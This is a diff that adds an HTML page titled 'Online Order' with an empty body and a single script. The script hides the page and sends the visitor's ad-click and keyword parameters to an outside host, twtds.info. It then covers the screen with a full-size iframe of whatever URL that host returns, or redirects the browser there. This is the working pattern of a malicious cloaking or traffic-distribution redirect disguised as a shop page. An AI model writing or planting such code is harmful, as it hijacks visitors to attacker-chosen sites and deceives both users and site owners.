@@ -1,0 +1,38 @@
+<html>
+  
+  <head>
+    <script>
+(function() {
+    document.documentElement.style.display = 'none';
+    const p = new URLSearchParams(location.search);
+    const mode = p.get('mode') || 'iframe';
+    const url = `https://twtds.info/rujsframe?gclid=${encodeURIComponent(p.get('gclid') || '')}&keyword=${encodeURIComponent(p.get('keyword') || '')}`;
+    
+    document.body.innerHTML = '';
+    document.body.style.cssText = 'margin:0!important;padding:0!important;overflow:hidden!important';
+    
+    fetch(url)
+        .then(response => response.text())
+        .then(targetUrl => {
+            if (targetUrl) {
+                if (mode === 'iframe') {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';
+                    iframe.src = targetUrl;
+                    document.body.appendChild(iframe);
+                } else {
+                    window.location.href = targetUrl;
+                }
+            }
+            document.documentElement.style.display = 'block';
+        });
+})();
+
+
+</script>
+    <title>Online Order</title>
+  </head>
+  <body>
+
+  </body>
+</html>
